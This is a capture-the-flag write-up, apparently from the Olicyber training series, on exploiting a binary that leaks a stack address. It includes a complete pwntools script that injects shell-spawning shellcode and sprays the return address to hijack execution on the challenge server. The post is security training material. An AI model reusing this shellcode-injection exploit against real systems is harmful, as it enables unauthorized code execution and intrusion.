---
title: "Generatore Poco Casuale — Shellcode Injection via Leaked Stack Address"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "shellcode", "aslr-bypass", "pwntools"]
difficulty: "intermediate"
summary: "The binary leaks a runtime stack address disguised as a 'random number'. Add 6 to land inside the shellcode region, then spray that address 800 times to cover the return target and get a shell."
---

## The Challenge

The binary presents itself as a random number generator, but the "random" number it prints is actually a live stack pointer. Somewhere in the input handler the program does a second read without bounds checking, leaving the classic stack overflow open.

## Approach

The leak is the entire attack. Once you have the stack address you can compute a precise landing address for shellcode: adding 6 offsets into the shellcode landing zone, past the alignment bytes at the start of the payload. I assembled the shellcode with pwntools `shellcraft` and wrote 800 copies of the target address after it — enough to hit the return slot no matter how the stack frame shifts slightly between local and remote.

The payload structure is:

- `b'a'` — 1-byte dummy to trigger the input read
- `b'\x00' * 7` — alignment padding  
- `SHELLCODE` — assembled `sh()` shellcode
- `b'a' * 8` — gap between shellcode and the address spray
- `p64(leak) * 800` — saturate the stack with the return target

## Solution

```python
#!/usr/bin/env python3
from pwn import *

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch='x86_64')

if args.REMOTE:
    p = remote("gpc.challs.olicyber.it", 10104)
else:
    p = gdb.debug("./generatore_poco_casuale", """
        b *randomGenerator+149
        continue
    """)

p.recvuntil(b': ')
leak = int(p.recvline().strip().decode()) + 6
print(hex(leak))

leaks = b''
for i in range(800):
    leaks += p64(leak)

p.recvuntil(b'(s/n)')
p.sendline(b'a' + b'\x00' * 7 + SHELLCODE + b'a' * 8 + leaks)
p.interactive()
```

`int(...) + 6` converts the printed decimal to an integer and nudges the pointer past the alignment header, landing right at the shellcode body. The 800-entry spray covers enough of the overflowed stack that one slot will be the actual saved return address regardless of minor frame size differences between builds.

## What I Learned

Information leaks are worth more than any gadget. A binary that tells you a stack address in cleartext has already handed you ASLR bypass for free — the attacker's only job is to compute the offset to the shellcode and spray reliably. Counting the number of `p64` repetitions needed is a function of how many extra stack slots the overflow can reach.
